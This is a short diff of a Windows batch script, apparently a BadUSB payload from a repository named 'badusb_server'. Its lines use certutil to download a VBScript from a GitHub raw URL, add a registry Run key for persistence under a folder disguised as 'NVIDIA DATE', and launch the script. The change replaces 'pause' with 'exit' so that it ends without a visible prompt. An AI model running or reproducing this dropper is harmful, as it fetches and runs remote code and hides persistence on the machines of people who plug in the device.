@@ -4,4 +4,4 @@ certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_ser
 certutil -urlcache -split -f https://raw.githubusercontent.com/KBT096/badusb_server/master/shut.vbs
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "C:\ProgramData\NVIDIA DATE\shut.vbs" /d "c:\windows\system32\regedit" /f
 "c:\ProgramData\NVIDIA DATE\shut.vbs"
- pause
+ exit
